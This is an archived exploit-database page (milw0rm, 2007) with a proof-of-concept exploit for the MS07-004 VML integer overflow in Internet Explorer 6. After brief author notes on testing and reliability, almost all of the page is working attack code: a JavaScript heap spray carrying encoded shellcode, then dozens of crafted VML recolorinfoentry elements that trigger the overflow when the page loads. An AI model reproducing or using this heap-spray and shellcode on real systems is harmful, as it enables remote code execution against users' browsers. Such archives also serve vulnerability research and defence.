<html><head><title>MS Internet Explorer VML Remote Buffer Overflow Exploit (MS07-004)</title></head><pre>&lt;!--

MS07-004 VML integer overflow exploit
  by lifeasageek at gmail.com

- Trigger CVMLRecolorinfo::InternalLoad() method
 you can see the screen captured image &quot;http://picasaweb.google.com/lifeasageek/MS07004/photo?pli=1#5019163989136880322&quot;
 which is generated by DarunGrim

- tested on WinXP SP2 Korean version( fully patched except kb929969)  &amp; IE 6.0
 and I hope it works well in English version

- sorry about that exploit hit ratio is only about 1/5
 If you have any good idea to improve reliability, please send me an
e-mail with your idea

- all the java script codes scratched from MS06-055 exploit written by Trirat Puttaraksa (Kira) &lt;trir00t [at] gmail.com&gt;
  and slightly modified

- 2007.1.15

--&gt;

&lt;html xmlns:v=&quot;urn:schemas-microsoft-com:vml&quot;&gt;

&lt;head&gt;
&lt;object id=&quot;VMLRender&quot;
classid=&quot;CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E&quot;&gt;
&lt;/object&gt;
&lt;style&gt;
v\:* { behavior: url(#VMLRender); }
&lt;/style&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;SCRIPT language=&quot;javascript&quot;&gt;
shellcode =
unescape(&quot;%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063&quot;);

bigblock = unescape(&quot;%u0505%u0505&quot;);
headersize = 20;
slackspace = headersize+shellcode.length;
while (bigblock.length&lt;slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i&lt;350;i++) memory[i] = block + shellcode;

&lt;/script&gt;

&lt;v:rect style='width:120pt;height:80pt' fillcolor=&quot;red&quot; &gt;
&lt;v:recolorinfo recolorstate=&quot;t&quot; numcolors=&quot;97612895&quot;&gt;

&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v:recolorinfoentry tocolor=&quot;rgb(1,1,1)&quot; recolortype=&quot;1285&quot;
lbcolor=&quot;rgb(1,1,1)&quot; forecolor=&quot;rgb(1,1,1)&quot; backcolor=&quot;rgb(1,1,1)&quot;
fromcolor=&quot;rgb(1,1,1)&quot; lbstyle =&quot;32&quot; bitmaptype=&quot;3&quot;/&gt;
&lt;v/recolorinfo&gt;
&lt;/html&gt;

# milw0rm.com [2007-01-16]</pre></html>